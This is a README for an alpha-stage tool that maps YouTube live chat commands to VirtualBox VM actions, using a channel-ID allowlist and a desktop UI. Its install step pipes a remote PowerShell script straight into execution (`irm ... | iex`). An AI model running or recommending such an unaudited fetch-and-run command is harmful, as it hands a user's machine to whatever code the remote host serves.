# YouTube Live Chat → VirtualBox Controller

A small bridge that lets you control VirtualBox VMs using commands sent in a YouTube live chat. This project is in an alpha state — use with caution. If you improve stability or add features, contributions and pull requests are welcome.

## Status

Alpha — actively being reworked. Not production-ready. Use on test machines and review code before running with elevated privileges.

## Features (example)

- Listen to a YouTube live chat stream
- Parse chat messages for predefined commands
- Map chat commands to VirtualBox actions (start, stop, pause, snapshot, send keyboard/mouse events)
- Access control using an allowlist of YouTube channel IDs
- Desktop UI showing VM state, action buttons, snapshots, and an event log
- Built-in chat commands: `!help`, `!status`, `!start`, `!stop`, `!pause`, `!resume`, `!reset`, and `!snapshot <name>`

## Requirements

- VirtualBox installed with its Python API available to the selected Python interpreter
- Python 3.8+
- Network access to YouTube live chat
- (Optional) A dedicated low-privilege account to run the controller

## Security notes

- Running remote-controlled VM actions is dangerous. Restrict access:
  - Configure trusted YouTube channel IDs in `allowed_users`; display names are not accepted
  - Keep the allowlist restricted to trusted channel IDs
  - Run controller with least privilege required
  - Test carefully on non-production systems

## Installation

On Windows, open PowerShell and run:

```powershell
irm https://df1011.github.io/ytlccv.ps1 | iex
```

The installer downloads the project requirements and launches the interactive
configuration tool. Review the script before executing it if you need to audit
the installation steps.

After installation, configure `config.json` with the VirtualBox VM name, the
YouTube live video ID, and at least one trusted channel ID in `allowed_users`.
An empty allowlist disables control commands; only `!help` and `!status` remain
public. Start the controller with:

```powershell
python main.py --config config.json
```

To run only the chat listener without the desktop UI:

```powershell
python main.py --config config.json --no-ui
```

For a local installation, clone the repository and run `installreq.bat` from
the project directory.

## Desktop UI and VM commands

The UI connects to the configured VM and provides start, stop, pause, resume,
reset, and snapshot actions. Long-running VM operations run in the background
so the window remains responsive.

The same VM actions can be sent from YouTube Live Chat:

| Command | Action |
| --- | --- |
| `!start` | Start the VM |
| `!stop` | Power down the VM |
| `!pause` | Pause the VM |
| `!resume` | Resume the VM |
| `!reset` | Reset the VM |
| `!snapshot <name>` | Create a snapshot |
| `!status` | Show the VM state |
| `!help` | List available commands |

## Configuration example (JSON)

```json
{
  "vm_name": "Test VM",
  "video_id": "YOUR_LIVE_STREAM_ID",
  "allowed_users": ["UCxxxxxxxxxxxxxxxxxxxxxx"],
  "Cust_plgs": {
    "!key": ["BadKeyboards", "press"],
    "!type": ["BadKeyboards", "type"],
    "!combo": ["BadKeyboards", "combo"],
    "!move": ["BadMouses", "move_rel"],
    "!click": ["BadMouses", "click"],
    "!scroll": ["BadMouses", "scroll"],
    "!focus": ["ForegroundStub", "focus"]
  }
}
```

`allowed_users` must contain YouTube channel IDs, not display names. If the
list is empty or absent, VM control commands are rejected. `!help` and
`!status` are read-only and remain available to all viewers.

## Typical command flow

1. A chat message is received and parsed.
2. The sender's YouTube channel ID is checked against `allowed_users`.
3. If authorized and the message matches a command, the corresponding VirtualBox Python API action is executed.
4. Results and errors are logged locally.

## Troubleshooting

- "Permission denied" when controlling VirtualBox:
  - Ensure the user running the script has permission to control VirtualBox.
- Chat commands are ignored:
  - Verify that `allowed_users` contains the sender's YouTube channel ID.
- Commands not recognized:
  - Check your config mapping and any command parsing rules.

## Contributing

Contributions are welcome. Suggested steps:
1. Fork the repo and create a feature branch.
2. Add tests (if applicable) and update the README/config examples.
3. Open a pull request describing the change and how to test it.

Please follow safe defaults and do not add code that elevates privileges without clear justification.

## Credits

Thanks to halohunter5283 for the project idea and to webik-216 (PuroTheNerd1) for the original code contributions.

## License

MIT; see [LICENSE.txt](LICENSE.txt).
